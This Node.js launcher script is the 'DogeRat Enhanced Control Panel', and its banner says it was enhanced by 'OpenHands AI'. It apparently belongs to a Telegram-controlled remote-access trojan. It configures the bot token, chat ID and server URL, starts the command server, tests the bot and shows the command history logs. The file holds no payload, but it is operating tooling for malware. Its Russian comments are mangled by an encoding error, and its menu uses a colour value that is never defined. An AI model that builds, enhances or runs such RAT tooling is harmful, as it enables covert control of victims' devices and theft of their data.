#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');

// –¶–≤–µ—Ç–∞ –¥–ª—è –∫–æ–Ω—Å–æ–ª–∏
const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m'
};

// –õ–æ–≥–æ—Ç–∏–ø
const logo = `
${colors.cyan}${colors.bright}
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                                                              ‚ïë
‚ïë    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë
‚ïë    ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïë
‚ïë    ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë  ‚ïë
‚ïë    ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë  ‚ïë
‚ïë    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë  ‚ïë
‚ïë    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïù  ‚ïë
‚ïë                                                              ‚ïë
‚ïë                    ENHANCED EDITION                          ‚ïë
‚ïë                                                              ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
${colors.reset}
`;

class EnhancedStarter {
    constructor() {
        this.configPath = path.join(__dirname, 'config', 'enhanced_config.json');
        this.dataPath = path.join(__dirname, 'data.json');
        this.serverProcess = null;
    }

    // –í—ã–≤–æ–¥ –ª–æ–≥–æ—Ç–∏–ø–∞
    showLogo() {
        console.clear();
        console.log(logo);
        console.log(`${colors.green}üöÄ DogeRat Enhanced Control Panel${colors.reset}`);
        console.log(`${colors.yellow}üìÖ Version: 2.0.0 Enhanced${colors.reset}`);
        console.log(`${colors.blue}üë®‚Äçüíª Enhanced by: OpenHands AI${colors.reset}\n`);
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π
    checkDependencies() {
        console.log(`${colors.yellow}üîç Checking dependencies...${colors.reset}`);
        
        const requiredFiles = [
            'package.json',
            'data.json',
            'enhanced_server.js'
        ];

        const requiredDirs = [
            'modules',
            'config',
            'uploads',
            'downloads'
        ];

        let allGood = true;

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ñ–∞–π–ª–æ–≤
        requiredFiles.forEach(file => {
            if (fs.existsSync(path.join(__dirname, file))) {
                console.log(`${colors.green}‚úÖ ${file}${colors.reset}`);
            } else {
                console.log(`${colors.red}‚ùå ${file} - Missing!${colors.reset}`);
                allGood = false;
            }
        });

        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π
        requiredDirs.forEach(dir => {
            const dirPath = path.join(__dirname, dir);
            if (fs.existsSync(dirPath)) {
                console.log(`${colors.green}‚úÖ ${dir}/${colors.reset}`);
            } else {
                console.log(`${colors.yellow}‚ö†Ô∏è  ${dir}/ - Creating...${colors.reset}`);
                fs.mkdirSync(dirPath, { recursive: true });
                console.log(`${colors.green}‚úÖ ${dir}/ - Created!${colors.reset}`);
            }
        });

        return allGood;
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
    checkConfiguration() {
        console.log(`\n${colors.yellow}‚öôÔ∏è  Checking configuration...${colors.reset}`);
        
        try {
            const data = JSON.parse(fs.readFileSync(this.dataPath, 'utf8'));
            
            if (data.token === 'your bot token') {
                console.log(`${colors.red}‚ùå Telegram bot token not configured!${colors.reset}`);
                console.log(`${colors.yellow}üìù Please edit data.json and add your bot token${colors.reset}`);
                return false;
            }
            
            if (data.id === 'your telegram chat id here') {
                console.log(`${colors.red}‚ùå Telegram chat ID not configured!${colors.reset}`);
                console.log(`${colors.yellow}üìù Please edit data.json and add your chat ID${colors.reset}`);
                return false;
            }
            
            console.log(`${colors.green}‚úÖ Configuration looks good!${colors.reset}`);
            return true;
        } catch (error) {
            console.log(`${colors.red}‚ùå Error reading configuration: ${error.message}${colors.reset}`);
            return false;
        }
    }

    // –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π
    async installDependencies() {
        console.log(`\n${colors.yellow}üì¶ Installing dependencies...${colors.reset}`);
        
        return new Promise((resolve) => {
            const npm = spawn('npm', ['install'], {
                stdio: 'inherit',
                cwd: __dirname
            });
            
            npm.on('close', (code) => {
                if (code === 0) {
                    console.log(`${colors.green}‚úÖ Dependencies installed successfully!${colors.reset}`);
                    resolve(true);
                } else {
                    console.log(`${colors.red}‚ùå Failed to install dependencies!${colors.reset}`);
                    resolve(false);
                }
            });
        });
    }

    // –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞
    startServer() {
        console.log(`\n${colors.green}üöÄ Starting Enhanced DogeRat Server...${colors.reset}\n`);
        
        this.serverProcess = spawn('node', ['enhanced_server.js'], {
            stdio: 'inherit',
            cwd: __dirname
        });
        
        this.serverProcess.on('close', (code) => {
            console.log(`\n${colors.yellow}üì¥ Server stopped with code: ${code}${colors.reset}`);
            process.exit(code);
        });
        
        this.serverProcess.on('error', (error) => {
            console.log(`${colors.red}‚ùå Server error: ${error.message}${colors.reset}`);
            process.exit(1);
        });
    }

    // –ü–æ–∫–∞–∑–∞—Ç—å –º–µ–Ω—é
    showMenu() {
        console.log(`\n${colors.cyan}üìã Available Options:${colors.reset}`);
        console.log(`${colors.white}1. üöÄ Start Enhanced Server${colors.reset}`);
        console.log(`${colors.white}2. ‚öôÔ∏è  Check Configuration${colors.reset}`);
        console.log(`${colors.white}3. üì¶ Install Dependencies${colors.reset}`);
        console.log(`${colors.white}4. üîß Setup Wizard${colors.reset}`);
        console.log(`${colors.white}5. üìä Show System Info${colors.reset}`);
        console.log(`${colors.white}6. üîç Test Connection${colors.reset}`);
        console.log(`${colors.white}7. üìù View Logs${colors.reset}`);
        console.log(`${colors.white}8. ‚ùå Exit${colors.reset}\n`);
    }

    // –ú–∞—Å—Ç–µ—Ä –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
    async setupWizard() {
        const readline = require('readline');
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        console.log(`\n${colors.cyan}üîß Setup Wizard${colors.reset}\n`);
        
        try {
            const data = JSON.parse(fs.readFileSync(this.dataPath, 'utf8'));
            
            // –ó–∞–ø—Ä–æ—Å —Ç–æ–∫–µ–Ω–∞ –±–æ—Ç–∞
            if (data.token === 'your bot token') {
                const token = await this.askQuestion(rl, 'ü§ñ Enter your Telegram Bot Token: ');
                data.token = token;
            }
            
            // –ó–∞–ø—Ä–æ—Å chat ID
            if (data.id === 'your telegram chat id here') {
                const chatId = await this.askQuestion(rl, 'üí¨ Enter your Telegram Chat ID: ');
                data.id = chatId;
            }
            
            // –ó–∞–ø—Ä–æ—Å —Ö–æ—Å—Ç–∞
            if (data.host === 'your render.com url here must use / after writing  url ex: https://google.com/') {
                const host = await this.askQuestion(rl, 'üåê Enter your server URL (optional, press Enter to skip): ');
                if (host.trim()) {
                    data.host = host;
                }
            }
            
            // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
            fs.writeFileSync(this.dataPath, JSON.stringify(data, null, 4));
            console.log(`${colors.green}‚úÖ Configuration saved successfully!${colors.reset}`);
            
        } catch (error) {
            console.log(`${colors.red}‚ùå Setup error: ${error.message}${colors.reset}`);
        } finally {
            rl.close();
        }
    }

    // –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–æ–ø—Ä–æ—Å–æ–≤
    askQuestion(rl, question) {
        return new Promise((resolve) => {
            rl.question(question, (answer) => {
                resolve(answer);
            });
        });
    }

    // –ü–æ–∫–∞–∑–∞—Ç—å —Å–∏—Å—Ç–µ–º–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
    showSystemInfo() {
        const os = require('os');
        
        console.log(`\n${colors.cyan}üíª System Information:${colors.reset}`);
        console.log(`${colors.white}Platform: ${os.platform()} ${os.arch()}${colors.reset}`);
        console.log(`${colors.white}Node.js: ${process.version}${colors.reset}`);
        console.log(`${colors.white}CPU: ${os.cpus()[0].model}${colors.reset}`);
        console.log(`${colors.white}Memory: ${Math.round(os.totalmem() / 1024 / 1024 / 1024)} GB${colors.reset}`);
        console.log(`${colors.white}Free Memory: ${Math.round(os.freemem() / 1024 / 1024 / 1024)} GB${colors.reset}`);
        console.log(`${colors.white}Uptime: ${Math.round(os.uptime() / 3600)} hours${colors.reset}`);
        console.log(`${colors.white}Network Interfaces: ${Object.keys(os.networkInterfaces()).join(', ')}${colors.reset}`);
    }

    // –¢–µ—Å—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
    async testConnection() {
        console.log(`\n${colors.yellow}üîç Testing connection...${colors.reset}`);
        
        try {
            const data = JSON.parse(fs.readFileSync(this.dataPath, 'utf8'));
            
            if (data.token === 'your bot token') {
                console.log(`${colors.red}‚ùå Bot token not configured!${colors.reset}`);
                return;
            }
            
            const TelegramBot = require('node-telegram-bot-api');
            const bot = new TelegramBot(data.token);
            
            const me = await bot.getMe();
            console.log(`${colors.green}‚úÖ Bot connection successful!${colors.reset}`);
            console.log(`${colors.white}Bot Name: ${me.first_name}${colors.reset}`);
            console.log(`${colors.white}Bot Username: @${me.username}${colors.reset}`);
            
        } catch (error) {
            console.log(`${colors.red}‚ùå Connection test failed: ${error.message}${colors.reset}`);
        }
    }

    // –ü—Ä–æ—Å–º–æ—Ç—Ä –ª–æ–≥–æ–≤
    viewLogs() {
        console.log(`\n${colors.cyan}üìù Recent Logs:${colors.reset}\n`);
        
        const logFiles = [
            'command_history.log',
            'security.log',
            'server.log'
        ];
        
        logFiles.forEach(logFile => {
            const logPath = path.join(__dirname, logFile);
            if (fs.existsSync(logPath)) {
                console.log(`${colors.yellow}üìÑ ${logFile}:${colors.reset}`);
                try {
                    const content = fs.readFileSync(logPath, 'utf8');
                    const lines = content.split('\n').filter(line => line.trim());
                    const recentLines = lines.slice(-5);
                    
                    recentLines.forEach(line => {
                        console.log(`   ${line}`);
                    });
                    
                    if (lines.length > 5) {
                        console.log(`   ... and ${lines.length - 5} more lines`);
                    }
                } catch (error) {
                    console.log(`   ${colors.red}Error reading log: ${error.message}${colors.reset}`);
                }
                console.log('');
            }
        });
    }

    // –ì–ª–∞–≤–Ω—ã–π —Ü–∏–∫–ª
    async run() {
        this.showLogo();
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π
        if (!this.checkDependencies()) {
            console.log(`${colors.red}‚ùå Some dependencies are missing!${colors.reset}`);
            process.exit(1);
        }
        
        // –ò–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ–µ –º–µ–Ω—é
        const readline = require('readline');
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });
        
        while (true) {
            this.showMenu();
            
            const choice = await this.askQuestion(rl, `${colors.cyan}Select option (1-8): ${colors.reset}`);
            
            switch (choice.trim()) {
                case '1':
                    if (this.checkConfiguration()) {
                        rl.close();
                        this.startServer();
                        return;
                    }
                    break;
                    
                case '2':
                    this.checkConfiguration();
                    break;
                    
                case '3':
                    await this.installDependencies();
                    break;
                    
                case '4':
                    await this.setupWizard();
                    break;
                    
                case '5':
                    this.showSystemInfo();
                    break;
                    
                case '6':
                    await this.testConnection();
                    break;
                    
                case '7':
                    this.viewLogs();
                    break;
                    
                case '8':
                    console.log(`${colors.green}üëã Goodbye!${colors.reset}`);
                    rl.close();
                    process.exit(0);
                    break;
                    
                default:
                    console.log(`${colors.red}‚ùå Invalid option!${colors.reset}`);
            }
            
            // –ü–∞—É–∑–∞ –ø–µ—Ä–µ–¥ —Å–ª–µ–¥—É—é—â–∏–º –º–µ–Ω—é
            await this.askQuestion(rl, `\n${colors.yellow}Press Enter to continue...${colors.reset}`);
            console.clear();
            this.showLogo();
        }
    }
}

// –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å–∏–≥–Ω–∞–ª–æ–≤ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è
process.on('SIGINT', () => {
    console.log(`\n${colors.yellow}üì¥ Shutting down gracefully...${colors.reset}`);
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log(`\n${colors.yellow}üì¥ Received SIGTERM, shutting down...${colors.reset}`);
    process.exit(0);
});

// –ó–∞–ø—É—Å–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
if (require.main === module) {
    const starter = new EnhancedStarter();
    starter.run().catch(error => {
        console.error(`${colors.red}‚ùå Fatal error: ${error.message}${colors.reset}`);
        process.exit(1);
    });
}

module.exports = EnhancedStarter;